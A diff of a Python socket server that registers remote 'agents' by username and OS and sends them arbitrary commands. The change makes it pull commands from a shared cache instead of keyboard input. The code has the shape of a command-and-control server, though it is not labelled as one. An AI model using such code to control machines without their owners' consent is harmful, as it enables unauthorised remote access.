@@ -12,13 +12,6 @@ PORT = 8888  # Set your port
 # File name
 CLIENTS_FILE = "connected_clients.json"
 
-# client socket objects list
-# global client_sockets
-# client_sockets = []
-
-# global count
-# count = 0
-
 
 def load_clients():
     if not os.path.exists(CLIENTS_FILE):
@@ -34,7 +27,6 @@ def load_clients():
 def save_clients(clients):
     with open(CLIENTS_FILE, "w") as file:
         json.dump(clients, file)
-
 
 
 def add_client(client_id, client_socket, username, client_os):
@@ -56,17 +48,6 @@ def add_client(client_id, client_socket, username, client_os):
     save_clients(clients)
     print(f"\nConnected agents: {list_clients()}")
     send_clients_info_to_group()
-    # global client_sockets
-    # client_sockets.append(client_socket)
-    # global count
-    # count = 5
-
-
-    print("=====CLIENT SOCKET", client_socket)
-    print("=====CLIENT SOCKET TYPE", type(client_socket))
-    connected_agents = cache.get('connected_agents', [])
-    connected_agents.append(client_socket.getpeername())  # ADD ADDRESS
-    cache.set('connected_agents', connected_agents)
 
 
 def remove_client(client_id):
@@ -83,8 +64,6 @@ def remove_all_clients():
     clients.clear()
     save_clients(clients)
     print(f"\nConnected agents: {list_clients()}")
-
-    cache.set('connected_agents', [])
 
 
 def list_clients():
@@ -115,16 +94,17 @@ class AgentHandler(threading.Thread):
         print(f"\nNew agent connected: {self.agent_address}")
         try:
             while True:
-                command = input(
-                    "\nEnter command to send to agent (type 'exit' to disconnect): ").strip()
+                command = cache.get('command', '')
+                cache.set('command', '')
                 if not command:
                     continue
                 self.agent_socket.send(command.encode())
                 if command.lower() == "exit":
+                    remove_client(self.agent_id)
                     break
                 response = self.agent_socket.recv(4096).decode()
-                print(f"\nResponse from agent {self.agent_address}:")
-                print(response)
+                print(
+                    f"\n{'=' * 20}\nResponse from agent {self.agent_address}:\n{response}\n{'=' * 20}\n")
         except Exception as e:
             print(
                 f"\nError communicating with agent {self.agent_address}: {e}")
@@ -148,10 +128,10 @@ def main():
             agent_handler = AgentHandler(agent_socket, agent_address)
             username = agent_socket.recv(4096).decode()
             client_os = agent_socket.recv(4096).decode()
-            
             agent_handler.start()
             # Add the client to the list
-            add_client(agent_handler.agent_id, agent_socket, username, client_os)
+            add_client(agent_handler.agent_id,
+                       agent_socket, username, client_os)
     except KeyboardInterrupt:
         print("\nServer shutting down...")
     finally:
